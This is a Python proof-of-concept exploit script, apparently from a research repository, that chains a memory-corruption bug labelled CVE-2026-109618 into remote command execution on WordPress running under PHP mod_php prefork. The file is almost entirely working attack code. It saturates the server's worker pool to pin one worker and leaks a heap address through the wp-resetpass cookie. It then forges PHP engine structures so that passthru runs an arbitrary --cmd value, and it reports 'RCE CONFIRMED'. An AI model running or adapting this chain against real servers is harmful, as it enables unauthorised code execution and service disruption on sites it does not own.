#!/usr/bin/env python3 -I
"""Full wp-resetpass CVE-2026-109618 leak->base->RCE (WordPress on mod_php prefork).

Two-request pre-RINIT dangle: request A is a chunked PHP_SESSION_UPLOAD_PROGRESS
multipart whose ~60 MB tail fatals past memory_limit before RINIT, so RSHUTDOWN
never runs and PS(http_session_vars) is left dangling on the surviving prefork
worker; request B reclaims that slot on the same pinned worker with a fake
HashTable + zend_fcall_info so the destructor path calls zend_call_function on a
named "passthru". The libphp base is leaked in-band via WordPress's wp-resetpass
Set-Cookie over-read of the reclaimed stale `len`. Proven uid=33 on 8.5.4/WP7.1.3.

Worker pin: saturate the prefork pool with slow blockers so A and B share one
worker. Offsets are per-build (ZEND_CALL_FUNCTION/DOFF/HTOFF/BASE_DELTAS).
Ports the CVE-2026-109618 technique from the Marven11 author PoC.

CLI: python3 -I poc/routes/wordpress/resetpass_rce.py [--url URL] [--cmd CMD] ...
    Default --url http://127.0.0.1:19500/wordpress. Run with -I.
"""

from __future__ import annotations

import argparse
import http.client
import http.cookies
import os
import secrets
import socket
import struct
import sys
import time
import urllib.parse

# shared canonical encoder + dangle seed
_POC_ROOT = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))  # poc/
if _POC_ROOT not in sys.path:
    sys.path.insert(0, _POC_ROOT)
from common.multipart import part as _mp_part  # noqa: E402
from primitives.groom.upload_progress_seed import (  # noqa: E402
    big_marker as _big_marker, producer_a as _producer_a)
from common.zend_mm import CHUNK_MASK as CHUNK_ALIGN  # noqa: E402

BOUNDARY = b"i097b"
ZEND_CALL_FUNCTION = 0x52A350
DEFAULT_DOFF = 0x76F00
DEFAULT_HTOFF = 0x2E8
CHUNK_SIZE = 262144
PAGE_SIZE = 0x1000
# CHUNK_ALIGN imported above from common.zend_mm (CHUNK_MASK = ZEND_MM_CHUNK_SIZE-1 = 0x1FFFFF)
BASE_DELTAS = (0x1800000, 0x1A00000)
PTR_LO = 0x700000000000
PTR_HI = 0x800000000000


# multipart building
def part(name: bytes, value: bytes, extra: bytes = b"") -> bytes:
    return _mp_part(name, value, extra=extra, boundary=BOUNDARY)


def mk_a(sid: bytes, tail_len: int = 60000000, npad: int = 60):
    """Producer A body, split (head, tail, end) for chunked streaming."""
    return _producer_a(sid, marker=_big_marker(), npad=npad, tail_len=tail_len,
                       boundary=BOUNDARY, split=True)


def mk_zstr(buf: bytearray, ar: int, addr: int, data: bytes) -> None:
    off = addr - ar
    if off < 0 or off + 24 + len(data) + 1 > len(buf):
        raise ValueError("fake zend_string outside m0 buffer")
    struct.pack_into("<I", buf, off, 1)
    struct.pack_into("<I", buf, off + 4, 0x16)
    struct.pack_into("<Q", buf, off + 8, 0)
    struct.pack_into("<Q", buf, off + 16, len(data))
    buf[off + 24:off + 24 + len(data)] = data


def build_exploit_b(sid, chunk, base, doff, htoff, cmd, write):
    """Consumer B body: reclaims the dangling PS slot with a fake HashTable +
    zend_fcall_info so pDestructor dispatches zend_call_function('passthru', cmd)."""
    body = part(b"pd", b"P" * 31) + part(b"PHPSESSID", sid)
    for i in range(30):
        body += part(("k%d" % i).encode(), b"K" * 7)
    if write:
        d = chunk + doff
        ar = chunk + doff - htoff
        buf = bytearray(3000)
        ht_off = d - ar
        fci_off = d + 0x60 - ar
        mask = ((PAGE_SIZE - (doff + 0x60)) // 4) & 0xFFFFFFFF
        ht = bytearray(64)
        struct.pack_into("<I", ht, 0, 1)
        struct.pack_into("<I", ht, 4, 7)
        struct.pack_into("<I", ht, 8, 0)
        struct.pack_into("<I", ht, 12, mask)
        struct.pack_into("<Q", ht, 16, d + 0x60)
        struct.pack_into("<I", ht, 24, 1)
        struct.pack_into("<I", ht, 28, 0)
        struct.pack_into("<I", ht, 32, 8)
        struct.pack_into("<Q", ht, 48, base + ZEND_CALL_FUNCTION)
        if ht_off < 0 or ht_off + len(ht) > len(buf):
            raise ValueError("fake HashTable outside m0 buffer")
        buf[ht_off:ht_off + len(ht)] = ht
        mk_zstr(buf, ar, ar + 0x500, b"passthru")
        mk_zstr(buf, ar, ar + 0x600, cmd)
        fci = bytearray(64)
        struct.pack_into("<Q", fci, 0, 64)
        struct.pack_into("<Q", fci, 8, ar + 0x500)
        struct.pack_into("<I", fci, 16, 6)
        struct.pack_into("<Q", fci, 24, ar + 0x780)
        struct.pack_into("<Q", fci, 32, ar + 0x700)
        struct.pack_into("<Q", fci, 40, 0)
        struct.pack_into("<I", fci, 48, 1)
        struct.pack_into("<Q", fci, 56, 0)
        if fci_off < 0 or fci_off + len(fci) > len(buf):
            raise ValueError("fake fci outside m0 buffer")
        buf[fci_off:fci_off + len(fci)] = fci
        struct.pack_into("<QI", buf, 0x700, ar + 0x600, 6)
        body += part(b"m0", bytes(buf))
    body += part(b"PHP_SESSION_UPLOAD_PROGRESS", b"M" * 7) + b"--" + BOUNDARY + b"--\r\n"
    return body


# HTTP plumbing (host-side http.client; chunked TE for A)
class Resp:
    def __init__(self, status, headers, body, error=None):
        self.status = status
        self.headers = headers
        self.body = body
        self.error = error


def _host_hdr(host, port):
    name = "[%s]" % host if ":" in host else host
    return name if port == 80 else "%s:%d" % (name, port)


def http_request(method, host, port, path, body, chunked, timeout):
    conn = http.client.HTTPConnection(host, port, timeout=timeout)
    try:
        conn.putrequest(method, path, skip_host=True, skip_accept_encoding=True)
        conn.putheader("Host", _host_hdr(host, port))
        if method == "POST":
            conn.putheader("Content-Type",
                           "multipart/form-data; boundary=" + BOUNDARY.decode())
            if chunked:
                conn.putheader("Transfer-Encoding", "chunked")
            else:
                conn.putheader("Content-Length", str(len(body)))
        conn.putheader("Connection", "close")
        conn.endheaders()
        if method == "POST":
            if chunked:
                for off in range(0, len(body), CHUNK_SIZE):
                    c = body[off:off + CHUNK_SIZE]
                    conn.send(("%x\r\n" % len(c)).encode() + c + b"\r\n")
                conn.send(b"0\r\n\r\n")
            else:
                conn.send(body)
        raw = conn.getresponse()
        return Resp(raw.status, raw.getheaders(), raw.read())
    except (http.client.HTTPException, OSError) as exc:
        return Resp(None, [], b"", "%s: %s" % (type(exc).__name__, exc))
    finally:
        conn.close()


def resetpass_cookie(headers):
    for name, value in headers:
        if name.lower() != "set-cookie" or not value.startswith("wp-resetpass-"):
            continue
        ck = http.cookies.SimpleCookie()
        try:
            ck.load(value)
        except http.cookies.CookieError:
            continue
        for morsel in ck.values():
            return urllib.parse.unquote_to_bytes(morsel.value)
    return None


def close_reset(sock):
    try:
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack("ii", 1, 0))
    except OSError:
        pass
    try:
        sock.close()
    except OSError:
        pass


def probe_saturated(host, port, path, timeout):
    try:
        sock = socket.create_connection((host, port), timeout=5)
    except OSError:
        return False
    try:
        sock.sendall(("GET %s HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n\r\n"
                      % (path, _host_hdr(host, port))).encode())
        sock.settimeout(timeout)
        try:
            data = sock.recv(100)
        except TimeoutError:
            close_reset(sock)
            return True
        close_reset(sock)
        return len(data) == 0
    except OSError:
        close_reset(sock)
        return False


# the chain
class Chain:
    def __init__(self, args):
        self.args = args
        p = urllib.parse.urlsplit(args.url)
        self.host = p.hostname
        self.port = p.port or 80
        self.base_path = p.path.rstrip("/")
        self.target_path = self.base_path + "/wp-content/index.php"
        self.leak_path = self.base_path + "/wp-login.php"
        self.chunk = None
        self.blockers = []

    def pin(self, label):
        bl = []
        for i in range(self.args.workers):
            try:
                s = socket.create_connection((self.host, self.port), timeout=10)
                s.sendall(b"GET / HTTP/1.1\r\nHost: " + _host_hdr(self.host, self.port).encode()
                          + b"\r\nX-Pad: " + b"A" * 64)
                bl.append(s)
            except OSError:
                break
        time.sleep(self.args.warmup)
        self.blockers = bl
        sat = probe_saturated(self.host, self.port, self.target_path, self.args.probe_timeout)
        if not bl or not sat:
            print("[!] %s: pin failed (blockers=%d saturated=%s)" % (label, len(bl), sat))
            self.release()
            return False
        close_reset(self.blockers.pop())
        time.sleep(0.25)
        print("[*] %s: pinned one worker (%d blockers)" % (label, len(self.blockers)))
        return True

    def release(self):
        for s in self.blockers:
            close_reset(s)
        self.blockers = []
        time.sleep(0.15)

    def leak_chunk(self):
        for att in range(1, self.args.leak_tries + 1):
            if not self.pin("leak%d" % att):
                continue
            sid = (b"i097L%d" % att + secrets.token_hex(14).encode())[:32]
            head, tail, end = mk_a(sid, npad=self.args.leak_npad)
            ra = http_request("POST", self.host, self.port, self.leak_path,
                              head + tail + end, True, self.args.timeout)
            items = [("pp%06d" % i, "G" * 7) for i in range(self.args.leak_pads)]
            items += [("action", "rp"), ("login", "L" * 7), ("key", "K" * 7)]
            tgt = urllib.parse.urlunsplit(("", "", self.leak_path, urllib.parse.urlencode(items), ""))
            lb = (part(b"PHPSESSID", sid) + part(b"PHP_SESSION_UPLOAD_PROGRESS", b"M" * 7)
                  + b"--" + BOUNDARY + b"--\r\n")
            rb = http_request("POST", self.host, self.port, tgt, lb, False, self.args.timeout)
            cookie = resetpass_cookie(rb.headers)
            self.release()
            clen = len(cookie) if cookie is not None else None
            print("[*] leak%d A=%s B=%s cookie=%s" % (
                att, ra.status, rb.status, clen if clen is not None else "---"))
            if cookie and len(cookie) > 16:
                hits = {}
                for i in range(len(cookie) - 7):
                    ptr = struct.unpack_from("<Q", cookie, i)[0]
                    if PTR_LO <= ptr < PTR_HI:
                        cand = ptr & ~CHUNK_ALIGN
                        hits[cand] = hits.get(cand, 0) + 1
                if hits:
                    self.chunk = max(hits, key=hits.get)
                    print("[+] in-band chunkbase = %#x" % self.chunk)
                    return self.chunk
        return None

    def attempt(self, base, tag, write=True, a_mode="full"):
        if not self.pin(tag):
            return None
        sid = (b"i097" + tag.encode()[:6].replace(b"_", b"-") + secrets.token_hex(14).encode())[:32]
        status_a = None
        if a_mode != "skip":
            head, tail, end = mk_a(sid, tail_len=0 if a_mode == "normal" else self.args.tail_len,
                                   npad=self.args.exp_npad)
            status_a = http_request("POST", self.host, self.port, self.target_path,
                                    head + tail + end, True, self.args.timeout).status
        cmd = (self.args.cmd + " ; echo %s" % tag).encode()
        try:
            body = build_exploit_b(sid, self.chunk, base, self.args.doff, self.args.htoff, cmd, write)
        except ValueError as exc:
            self.release()
            print("[!] %s setup error: %s" % (tag, exc))
            return None
        rb = http_request("POST", self.host, self.port, self.target_path, body, False, self.args.timeout)
        alive = http_request("GET", self.host, self.port, self.target_path, b"", False, 10).status
        self.release()
        uid = b"uid=" in rb.body
        uname = b"GNU/Linux" in rb.body
        tag_hit = tag.encode() in rb.body
        ok = rb.status == 200 and uid and uname and tag_hit
        if self.args.outdir:
            with open(os.path.join(self.args.outdir, "raw_%s.bin" % tag), "wb") as h:
                h.write(rb.body)
        print("[%s] %-16s A=%-4s B=%-4s len=%-5d uid=%-5s uname=%-5s tag=%-5s alive=%s" % (
            "+" if ok else "-", tag, status_a, rb.status, len(rb.body), uid, uname, tag_hit, alive))
        return {"ok": ok, "uid": uid, "uname": uname, "tag": tag_hit, "status_b": rb.status,
                "alive": alive, "body": rb.body, "base": base}

    def resolve_base(self):
        for idx, base in enumerate(c - d for c, d in ((self.chunk, bd) for bd in BASE_DELTAS)):
            r = self.attempt(base, "I097_BASE%d" % idx)
            if r and r["ok"]:
                print("[+] libphp base resolved: %#x (candidate %d)" % (base, idx))
                return base
            print("[*] candidate %d (%#x) rejected" % (idx, base))
        return None

    def run(self):
        if self.args.outdir:
            os.makedirs(self.args.outdir, exist_ok=True)
        if self.leak_chunk() is None:
            print("[-] chunk base leak failed")
            return 1
        if self.args.base is not None:
            base = int(self.args.base, 16)
            print("[+] base supplied: %#x" % base)
        else:
            base = self.resolve_base()
            if base is None:
                print("[-] base disambiguation failed on both candidates")
                return 1
        ok = 0
        last = None
        for i in range(self.args.rounds):
            r = self.attempt(base, "I097_R%d" % i)
            if r and r["ok"]:
                ok += 1
                last = r
        print("=" * 64)
        print("[=] chunk=%#x base=%#x d=chunk+%#x htoff=%#x rounds=%d/%d" % (
            self.chunk, base, self.args.doff, self.args.htoff, ok, self.args.rounds))
        if ok:
            idline = last["body"].split(b"\n", 1)[0].decode("latin1", "replace")
            print("[+] RCE CONFIRMED: %s" % idline)
            return 0
        print("[-] no round produced RCE output")
        return 1


def build_parser():
    ap = argparse.ArgumentParser(description="wp-resetpass CVE-2026-109618 full RCE "
                                             "(PHP 8.5.4-0ubuntu1 / WP 7.1.3, .1 build)")
    ap.add_argument("--url", default="http://127.0.0.1:19500/wordpress")
    ap.add_argument("--cmd", default="id; uname -a")
    ap.add_argument("--workers", type=int, default=150)
    ap.add_argument("--warmup", type=float, default=10.0)
    ap.add_argument("--probe-timeout", dest="probe_timeout", type=float, default=2.5)
    ap.add_argument("--leak-npad", dest="leak_npad", type=int, default=30)
    ap.add_argument("--leak-pads", dest="leak_pads", type=int, default=125)
    ap.add_argument("--leak-tries", dest="leak_tries", type=int, default=4)
    ap.add_argument("--exp-npad", dest="exp_npad", type=int, default=60)
    ap.add_argument("--tail-len", dest="tail_len", type=int, default=60000000)
    ap.add_argument("--doff", type=lambda v: int(v, 0), default=DEFAULT_DOFF)
    ap.add_argument("--htoff", type=lambda v: int(v, 0), default=DEFAULT_HTOFF)
    ap.add_argument("--base", default=None, help="supply libphp base (hex), skip resolve")
    ap.add_argument("--rounds", type=int, default=3)
    ap.add_argument("--timeout", type=float, default=300.0)
    ap.add_argument("--outdir", default=None, help="dir to dump raw B bodies")
    return ap


def main():
    args = build_parser().parse_args()
    return Chain(args).run()


if __name__ == "__main__":
    sys.exit(main())
